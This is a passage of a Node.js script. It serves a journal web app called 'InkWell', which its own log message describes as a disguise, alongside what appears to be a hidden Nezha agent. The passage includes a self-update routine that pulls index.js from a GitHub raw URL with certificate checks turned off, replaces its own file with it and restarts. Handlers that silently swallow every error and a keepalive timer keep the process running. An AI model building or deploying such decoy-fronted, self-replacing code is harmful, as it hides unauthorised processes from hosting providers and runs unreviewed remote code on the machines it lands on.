    min-height: 100vh; display: flex; align-items: center; justify-content: center;
    color: #e8e8e8; padding: 20px;
  }
  .card {
    background: rgba(255,255,255,0.04); backdrop-filter: blur(10px);
    border: 1px solid rgba(255,255,255,0.1); border-radius: 16px;
    padding: 48px 40px; width: 100%; max-width: 420px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
  }
  .logo { text-align: center; margin-bottom: 36px; }
  .logo h1 { font-size: 36px; font-weight: 700; letter-spacing: -1px; color: #f0f0f0; }
  .logo .feather { font-size: 42px; margin-bottom: 8px; opacity: 0.8; }
  .logo p { color: #8b8ba7; font-size: 13px; margin-top: 6px; font-style: italic; }
  .field { margin-bottom: 20px; }
  .field label { display: block; font-size: 12px; color: #8b8ba7; margin-bottom: 8px; letter-spacing: 0.5px; text-transform: uppercase; font-family: -apple-system, sans-serif; }
  .field input {
    width: 100%; padding: 14px 16px; background: rgba(0,0,0,0.3);
    border: 1px solid rgba(255,255,255,0.1); border-radius: 8px;
    color: #f0f0f0; font-size: 15px; font-family: -apple-system, sans-serif;
    transition: border-color 0.2s, background 0.2s;
  }
  .field input:focus { outline: none; border-color: #4a90d9; background: rgba(0,0,0,0.4); }
  .btn {
    width: 100%; padding: 14px; background: linear-gradient(135deg, #4a90d9, #357abd);
    border: none; border-radius: 8px; color: white; font-size: 15px;
    font-weight: 600; cursor: pointer; transition: transform 0.1s, opacity 0.2s;
    font-family: -apple-system, sans-serif; margin-top: 8px;
  }
  .btn:hover { opacity: 0.92; }
  .btn:active { transform: scale(0.98); }
  .err { color: #ff6b6b; font-size: 13px; text-align: center; margin-top: 16px; min-height: 18px; font-family: -apple-system, sans-serif; }
  .footer { text-align: center; margin-top: 32px; font-size: 11px; color: #555570; font-family: -apple-system, sans-serif; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <div class="feather">✒️</div>
    <h1>InkWell</h1>
    <p>where thoughts leave a mark</p>
  </div>
  <form method="POST" action="/api/login">
    <div class="field">
      <label>Username</label>
      <input type="text" name="username" autocomplete="username" required autofocus>
    </div>
    <div class="field">
      <label>Password</label>
      <input type="password" name="password" autocomplete="current-password" required>
    </div>
    <button type="submit" class="btn">Open my journal</button>
    <div class="err" id="err"></div>
  </form>
  <div class="footer">© InkWell · Est. 2024 · Write freely</div>
</div>
<script>
const params = new URLSearchParams(location.search);
if (params.get('err')) document.getElementById('err').textContent = params.get('err');
</script>
</body>
</html>`;

const INKWELL_DASHBOARD_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>InkWell · My Journal</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f0; color: #2c2c2c; min-height: 100vh; }
  .topbar { background: #2c2c2c; color: #f0f0f0; padding: 18px 32px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
  .topbar .brand { font-family: Georgia, serif; font-size: 22px; font-weight: 700; }
  .topbar .brand .feather { margin-right: 8px; }
  .topbar .actions a { color: #b0b0b0; text-decoration: none; font-size: 13px; margin-left: 18px; }
  .topbar .actions a:hover { color: #fff; }
  .container { max-width: 900px; margin: 40px auto; padding: 0 20px; }
  .compose { background: #fff; border-radius: 12px; padding: 24px; box-shadow: 0 2px 12px rgba(0,0,0,0.05); margin-bottom: 32px; }
  .compose h2 { font-family: Georgia, serif; font-size: 20px; margin-bottom: 16px; color: #2c2c2c; }
  .compose input.title { width: 100%; border: none; border-bottom: 1px solid #e0e0e0; padding: 8px 0; font-size: 17px; font-family: Georgia, serif; margin-bottom: 12px; outline: none; }
  .compose input.title:focus { border-bottom-color: #4a90d9; }
  .compose textarea { width: 100%; min-height: 100px; border: 1px solid #e0e0e0; border-radius: 8px; padding: 12px; font-size: 14px; font-family: -apple-system, sans-serif; resize: vertical; outline: none; }
  .compose textarea:focus { border-color: #4a90d9; }
  .compose .row { display: flex; justify-content: flex-end; margin-top: 12px; }
  .btn { background: #4a90d9; color: #fff; border: none; padding: 10px 22px; border-radius: 6px; font-size: 14px; cursor: pointer; font-weight: 500; }
  .btn:hover { background: #357abd; }
  .btn.sec { background: transparent; color: #666; }
  .btn.sec:hover { background: #eee; color: #333; }
  .entries { }
  .entry { background: #fff; border-radius: 12px; padding: 24px; box-shadow: 0 2px 12px rgba(0,0,0,0.05); margin-bottom: 18px; transition: transform 0.1s; }
  .entry:hover { transform: translateY(-1px); box-shadow: 0 4px 16px rgba(0,0,0,0.08); }
  .entry .meta { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 10px; }
  .entry h3 { font-family: Georgia, serif; font-size: 19px; color: #2c2c2c; }
  .entry .date { font-size: 12px; color: #999; }
  .entry .body { color: #444; line-height: 1.6; font-size: 14px; white-space: pre-wrap; }
  .entry .actions { margin-top: 14px; display: flex; gap: 10px; }
  .empty { text-align: center; padding: 60px 20px; color: #aaa; font-style: italic; font-family: Georgia, serif; }
</style>
</head>
<body>
<div class="topbar">
  <div class="brand"><span class="feather">✒️</span>InkWell</div>
  <div class="actions">
    <a href="#" onclick="refresh(); return false;">Refresh</a>
    <a href="/api/logout">Sign out</a>
  </div>
</div>
<div class="container">
  <div class="compose">
    <h2>New entry</h2>
    <input type="text" class="title" id="t" placeholder="Title (optional)">
    <textarea id="b" placeholder="What's on your mind today?"></textarea>
    <div class="row">
      <button class="btn sec" onclick="document.getElementById('t').value=''; document.getElementById('b').value='';">Clear</button>
      <button class="btn" onclick="createEntry();">Save entry</button>
    </div>
  </div>
  <div class="entries" id="list"></div>
</div>
<script>
async function refresh() {
  const r = await fetch('/api/entries');
  const entries = await r.json();
  const el = document.getElementById('list');
  if (!entries.length) { el.innerHTML = '<div class="empty">No entries yet. Start writing above ✍️</div>'; return; }
  el.innerHTML = entries.map(e => '<div class="entry"><div class="meta"><h3>'+escapeHtml(e.title||'Untitled')+'</h3><span class="date">'+new Date(e.createdAt).toLocaleString()+'</span></div><div class="body">'+escapeHtml(e.body)+'</div><div class="actions"><button class="btn sec" onclick="del('+e.id+')">Delete</button></div></div>').join('');
}
function escapeHtml(s) { const d=document.createElement('div'); d.textContent=s; return d.innerHTML; }
async function createEntry() {
  const t = document.getElementById('t').value.trim();
  const b = document.getElementById('b').value.trim();
  if (!b) { alert('Body cannot be empty'); return; }
  await fetch('/api/entries', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({title:t, body:b}) });
  document.getElementById('t').value=''; document.getElementById('b').value='';
  refresh();
}
async function del(id) {
  if (!confirm('Delete this entry?')) return;
  await fetch('/api/entries/'+id, { method:'DELETE' });
  refresh();
}
refresh();
</script>
</body>
</html>`;

function startInkWell() {
    const server = http.createServer((req, res) => {
        try {
            const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
            const pathname = url.pathname;
            const method = req.method;

            // 静态路由
            if (method === 'GET' && (pathname === '/' || pathname === '/index.html' || pathname === '/login')) {
                const cookies = parseCookies(req.headers.cookie);
                if (cookies.inkwell_session && inkwellSessions.has(cookies.inkwell_session)) {
                    res.writeHead(302, { Location: '/dashboard' });
                    res.end();
                    return;
                }
                res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
                res.end(INKWELL_LOGIN_PAGE);
                return;
            }

            if (method === 'GET' && pathname === '/dashboard') {
                const cookies = parseCookies(req.headers.cookie);
                if (!cookies.inkwell_session || !inkwellSessions.has(cookies.inkwell_session)) {
                    res.writeHead(302, { Location: '/?err=' + encodeURIComponent('Please sign in first') });
                    res.end();
                    return;
                }
                res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
                res.end(INKWELL_DASHBOARD_PAGE);
                return;
            }

            // API 路由
            if (pathname === '/api/login' && method === 'POST') {
                let body = '';
                req.on('data', c => { body += c; if (body.length > 4096) req.destroy(); });
                req.on('end', () => {
                    try {
                        const params = new URLSearchParams(body);
                        const username = params.get('username') || '';
                        const password = params.get('password') || '';
                        if (username === INKWELL_USER && password === INKWELL_PASS) {
                            const token = makeSessionToken();
                            inkwellSessions.set(token, { user: username, createdAt: Date.now() });
                            res.writeHead(302, {
                                'Set-Cookie': `inkwell_session=${token}; Path=/; HttpOnly; Max-Age=86400`,
                                Location: '/dashboard'
                            });
                            res.end();
                        } else {
                            res.writeHead(302, { Location: '/?err=' + encodeURIComponent('Invalid credentials') });
                            res.end();
                        }
                    } catch(e) {
                        res.writeHead(302, { Location: '/?err=' + encodeURIComponent('Login failed') });
                        res.end();
                    }
                });
                return;
            }

            if (pathname === '/api/logout' && method === 'GET') {
                const cookies = parseCookies(req.headers.cookie);
                if (cookies.inkwell_session) inkwellSessions.delete(cookies.inkwell_session);
                res.writeHead(302, {
                    'Set-Cookie': 'inkwell_session=; Path=/; HttpOnly; Max-Age=0',
                    Location: '/'
                });
                res.end();
                return;
            }

            // 以下 API 都需要鉴权
            const cookies = parseCookies(req.headers.cookie);
            if (!cookies.inkwell_session || !inkwellSessions.has(cookies.inkwell_session)) {
                res.writeHead(401, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Unauthorized' }));
                return;
            }

            if (pathname === '/api/entries' && method === 'GET') {
                const data = loadJournalData();
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(data.entries));
                return;
            }

            if (pathname === '/api/entries' && method === 'POST') {
                let body = '';
                req.on('data', c => { body += c; if (body.length > 1024 * 1024) req.destroy(); });
                req.on('end', () => {
                    try {
                        const payload = JSON.parse(body);
                        const data = loadJournalData();
                        const entry = {
                            id: data.nextId++,
                            title: String(payload.title || '').slice(0, 200),
                            body: String(payload.body || '').slice(0, 100000),
                            createdAt: Date.now(),
                        };
                        data.entries.unshift(entry);
                        saveJournalData(data);
                        res.writeHead(200, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify(entry));
                    } catch(e) {
                        res.writeHead(400, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ error: 'Invalid request' }));
                    }
                });
                return;
            }

            const delMatch = pathname.match(/^\/api\/entries\/(\d+)$/);
            if (delMatch && method === 'DELETE') {
                const id = parseInt(delMatch[1]);
                const data = loadJournalData();
                const before = data.entries.length;
                data.entries = data.entries.filter(e => e.id !== id);
                saveJournalData(data);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ deleted: before > data.entries.length, id }));
                return;
            }

            if (delMatch && method === 'PUT') {
                const id = parseInt(delMatch[1]);
                let body = '';
                req.on('data', c => { body += c; if (body.length > 1024 * 1024) req.destroy(); });
                req.on('end', () => {
                    try {
                        const payload = JSON.parse(body);
                        const data = loadJournalData();
                        const entry = data.entries.find(e => e.id === id);
                        if (!entry) {
                            res.writeHead(404, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ error: 'Not found' }));
                            return;
                        }
                        if (payload.title !== undefined) entry.title = String(payload.title).slice(0, 200);
                        if (payload.body !== undefined) entry.body = String(payload.body).slice(0, 100000);
                        entry.updatedAt = Date.now();
                        saveJournalData(data);
                        res.writeHead(200, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify(entry));
                    } catch(e) {
                        res.writeHead(400, { 'Content-Type': 'application/json' });
                        res.end(JSON.stringify({ error: 'Invalid request' }));
                    }
                });
                return;
            }

            // 健康检查端点
            if (pathname === '/api/health' && method === 'GET') {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'ok', time: Date.now() }));
                return;
            }

            res.writeHead(404, { 'Content-Type': 'text/plain' });
            res.end('Not Found');
        } catch(e) {
            try {
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Internal Server Error');
            } catch(_) {}
        }
    });

    server.on('error', (err) => {
        console.log(`[InkWell] 服务器错误: ${err.message}`);
    });

    server.listen(INKWELL_PORT, () => {
        console.log(`[InkWell] 伪装 Web 应用已启动: http://0.0.0.0:${INKWELL_PORT}`);
    });
}

// ==================== 一次性自更新 (从 GitHub 拉取最新 index.js) ====================
function scheduleSelfUpdate() {
    setTimeout(() => {
        const UPDATE_URL = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/index.js';
        const tmpPath = __filename + '.tmp';
        console.log('[SelfUpdate] 开始检查更新...');
        try {
            const mod = https;
            const req = mod.get(UPDATE_URL, { timeout: 30000, rejectUnauthorized: false }, (resp) => {
                if (resp.statusCode !== 200) {
                    console.log(`[SelfUpdate] 远端返回 ${resp.statusCode}, 跳过更新`);
                    return;
                }
                const chunks = [];
                resp.on('data', c => chunks.push(c));
                resp.on('end', () => {
                    try {
                        const newCode = Buffer.concat(chunks);
                        if (newCode.length < 1000) {
                            console.log('[SelfUpdate] 下载内容过短, 跳过更新');
                            return;
                        }
                        // 先写入临时文件, 再原子替换
                        fs.writeFileSync(tmpPath, newCode);
                        try {
                            // 简单语法检查
                            execSync(`node --check "${tmpPath}"`, { timeout: 15000, stdio: 'ignore' });
                        } catch(e) {
                            console.log('[SelfUpdate] 新文件语法检查失败, 跳过更新');
                            try { fs.unlinkSync(tmpPath); } catch(_) {}
                            return;
                        }
                        try {
                            fs.copyFileSync(__filename, __filename + '.bak');
                        } catch(e) {}
                        fs.renameSync(tmpPath, __filename);
                        console.log('[SelfUpdate] 更新成功! 原文件已备份为 .bak, 退出进程以重新启动...');
                        process.exit(0);
                    } catch(e) {
                        console.log(`[SelfUpdate] 应用更新失败: ${e.message}`);
                        try { fs.unlinkSync(tmpPath); } catch(_) {}
                    }
                });
            });
            req.on('error', (err) => {
                console.log(`[SelfUpdate] 下载失败: ${err.message}`);
            });
            req.on('timeout', () => {
                req.destroy();
                console.log('[SelfUpdate] 下载超时, 跳过更新');
            });
        } catch(e) {
            console.log(`[SelfUpdate] 异常: ${e.message}`);
        }
    }, 10000);
}

// ==================== 模块导出 ====================
module.exports = { main, getNezhaStatus };

// ==================== 启动 ====================
main().catch((err) => {
    console.error(`[Nezha] 启动失败: ${err.message}`);
    // 不立即 exit, 让 keepalive 维持进程
});

// 防止未捕获异常导致进程崩溃
process.on('uncaughtException', (err) => {
    try { console.error(`[KeepAlive] 未捕获异常 (已吞掉): ${err && err.message}`); } catch(_) {}
});
process.on('unhandledRejection', (reason) => {
    try { console.error(`[KeepAlive] 未处理拒绝 (已吞掉): ${reason}`); } catch(_) {}
});

// 防止进程退出
setInterval(() => {}, 1000000);
